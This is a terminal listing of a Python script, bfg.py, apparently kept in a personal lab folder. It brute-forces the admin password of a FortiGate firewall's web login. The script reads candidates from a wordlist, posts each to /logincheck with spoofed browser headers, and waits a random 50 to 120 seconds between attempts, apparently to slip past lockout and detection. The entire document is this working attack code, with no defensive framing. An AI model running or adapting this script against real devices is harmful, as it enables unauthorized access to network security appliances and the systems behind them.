
c@ubuntu:~/LABS/_BruteFortiGates.py$ cat bfg.py
#!/usr/bin/env python3
# bfg.py -- brute forti gate
#
# 18.04.2023 @ 17:20
#
# slow brute force script to check fortigate's password from file
#

import requests
from random import *
from time import *

session = requests.session()
words = open('WORDS.txt', 'r')

for passwd in words:

    num = randint(50, 120)
    print("...sleeping... %s" % num)
    sleep(num)
    passwd = passwd.rstrip()

    burp0_url = "http://192.168.56.222:80/logincheck"

    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Accept": "*/*", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Origin": "http://192.168.56.222", "Connection": "close", "Referer": "http://192.168.56.222/login?redir=%2F"}

    burp0_data = {"ajax": "1", "username": "admin", "secretkey": passwd, "redir": "/"}

    print("> checking passwd: %s" % passwd)

    try:
        req = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
        resp = req.text
        print(resp)
        print("OK DONE with passwd: %s" % passwd )

        # 0 in resp = no; 2 in resp = no; 1 in resp = redir = yes


    except requests.exceptions.RequestException as e:
        print(e)



print('fin.')




